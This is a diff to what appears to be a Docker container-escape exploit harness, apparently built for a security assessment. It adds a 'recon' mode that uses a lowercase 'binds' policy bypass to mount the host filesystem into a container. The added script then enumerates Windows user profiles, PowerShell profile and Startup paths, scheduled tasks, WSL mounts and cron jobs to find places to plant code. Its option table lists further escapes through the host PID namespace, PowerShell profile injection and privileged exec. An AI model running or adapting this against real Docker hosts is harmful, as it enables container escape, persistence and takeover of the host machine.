@@ -13,6 +13,7 @@
 #           1b   #1 nested lowercase keys under HostConfig → pop calc (host PID ns)
 #           1c   #1 minimal: `binds` only                 → host-fs read+write
 #           fs   #1 filesystem-only calc pop               → PS profile injection
+#           recon recon: enumerate host fs for calc trigger paths
 #           7    #7 privileged exec-create                → host raw-disk (best-effort)
 #           mask MaskedPaths unmask (NON-destructive probe, no sysrq)
 #           list show this table
@@ -241,6 +242,63 @@ fi'
     "{\"Image\":\"$IMAGE\",\"Cmd\":$(cmd_json "$FSPOP"),\"HostConfig\":{\"binds\":[\"/:/host\"]}}")
   [[ -z "$CID" ]] && refused
   CLEAN_IDS+=("$CID"); echo "[+] created $CID (host / at /host via lowercase binds bypass)"; run_and_log "$CID"
+  ;;
+# ── Recon: enumerate host filesystem for calc trigger paths ──────────────────
+recon)
+  pull
+  RECON='set +e
+echo "=== HOST INFO ==="
+echo "hostname: $(cat /host/etc/hostname 2>/dev/null)"
+echo "os-release: $(head -3 /host/etc/os-release 2>/dev/null)"
+echo ""
+echo "=== /host/mnt/ (drive mounts) ==="
+ls -la /host/mnt/ 2>/dev/null
+echo ""
+echo "=== Windows users ==="
+for d in /host/mnt/c/Users/*/; do
+  u=$(basename "$d")
+  case "$u" in Public|Default|"Default User"|"All Users") continue;; esac
+  echo "--- $u ---"
+  echo "  Documents:     $(ls "$d/Documents/" 2>/dev/null | head -5)"
+  echo "  PS5 profile:   $(ls "$d/Documents/WindowsPowerShell/" 2>/dev/null)"
+  echo "  PS7 profile:   $(ls "$d/Documents/PowerShell/" 2>/dev/null)"
+  echo "  OneDrive/Docs: $(ls "$d/OneDrive/Documents/" 2>/dev/null | head -5)"
+  echo "  OneDrive/PS5:  $(ls "$d/OneDrive/Documents/WindowsPowerShell/" 2>/dev/null)"
+  echo "  OneDrive/PS7:  $(ls "$d/OneDrive/Documents/PowerShell/" 2>/dev/null)"
+  echo "  Startup:       $(ls "$d/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/" 2>/dev/null)"
+  echo "  AppData/Local: $(ls "$d/AppData/Local/" 2>/dev/null | head -10)"
+done
+echo ""
+echo "=== ProgramData Startup ==="
+ls -la "/host/mnt/c/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/" 2>/dev/null
+echo ""
+echo "=== Scheduled Tasks ==="
+ls /host/mnt/c/Windows/System32/Tasks/ 2>/dev/null | head -10
+echo ""
+echo "=== /host/mnt/wsl/ (cross-distro) ==="
+ls -la /host/mnt/wsl/ 2>/dev/null
+echo ""
+echo "=== WSL distros visible from Docker WSL ==="
+for d in /host/mnt/wsl/*/; do [ -d "$d" ] && echo "$d: $(ls "$d" 2>/dev/null | head -5)"; done 2>/dev/null
+echo ""
+echo "=== binfmt_misc ==="
+ls /host/proc/sys/fs/binfmt_misc/ 2>/dev/null
+cat /host/proc/sys/fs/binfmt_misc/WSLInterop 2>/dev/null
+echo ""
+echo "=== running processes (host PID ns if pidmode:host) ==="
+ps aux 2>/dev/null | head -20
+echo ""
+echo "=== cron/at ==="
+ls /host/etc/cron.d/ /host/var/spool/cron/ /host/var/spool/at/ 2>/dev/null
+crontab -l 2>/dev/null
+echo ""
+echo "=== init system ==="
+ls /host/etc/init.d/ 2>/dev/null | head -10
+cat /host/etc/inittab 2>/dev/null | head -5'
+  CID=$(create_raw "huddle-$STAMP" \
+    "{\"Image\":\"$IMAGE\",\"Cmd\":$(cmd_json "$RECON"),\"HostConfig\":{\"binds\":[\"/:/host\"]}}")
+  [[ -z "$CID" ]] && refused
+  CLEAN_IDS+=("$CID"); echo "[+] recon container $CID"; run_and_log "$CID"
   ;;
 # ── Finding #7: privileged exec-create ───────────────────────────────────────
 # Create a NORMAL (allowed) container, then exec into it with Privileged:true.
